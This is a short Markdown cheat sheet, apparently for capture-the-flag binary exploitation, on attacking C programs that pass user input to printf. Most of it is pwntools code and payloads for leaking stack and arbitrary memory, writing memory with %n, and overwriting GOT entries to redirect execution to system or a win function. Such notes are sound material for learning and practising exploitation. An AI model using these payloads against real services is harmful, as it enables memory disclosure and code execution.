# Format String Playbook

## Detect

If `printf(user_input)` (no format specifier), send `%p %p %p %p %p %p %p %p` and observe leaked stack values.

## Find the "offset"

```python
# Send "AAAA %p %p %p %p %p %p %p %p" — find where 0x41414141 appears in the leak.
# The position N is your offset.
io.sendline(b'AAAAAAAA ' + b'%p '*20)
```

## Read arbitrary memory

```python
# offset N, reading 8 bytes at address addr:
payload = p64(addr) + f'%{N}$s'.encode()
io.sendline(payload)
# parse the leaked value after padding
```

Or with pwntools:
```python
from pwn import fmtstr_payload, FmtStr
fmt = FmtStr(execute_fmt=lambda p: send_payload(p))
addr_content = fmt.leak(addr)
```

## Write arbitrary memory (GOT overwrite)

```python
from pwn import fmtstr_payload
# overwrite elf.got['printf'] with address of win()
payload = fmtstr_payload(OFFSET, {elf.got['printf']: elf.symbols['win']})
io.sendline(payload)
```

## Typical exploit sketch (GOT overwrite)

```python
# 1. Leak libc:    read 8 bytes of some libc-resolved GOT entry
# 2. Compute libc base
# 3. Overwrite a GOT entry (e.g., printf) with system or one_gadget
# 4. Trigger the overwritten function (send input that causes printf again)
```

## Gotchas

- On 64-bit, offsets shift by +1 per 8 bytes of payload alignment. `fmtstr_payload` handles this.
- `%n` is sometimes disabled by `FORTIFY_SOURCE` or glibc hardening. Fall back to leak-only and use the leak to enable a different chain.
- Network services may buffer — send `\n` or `flush`.
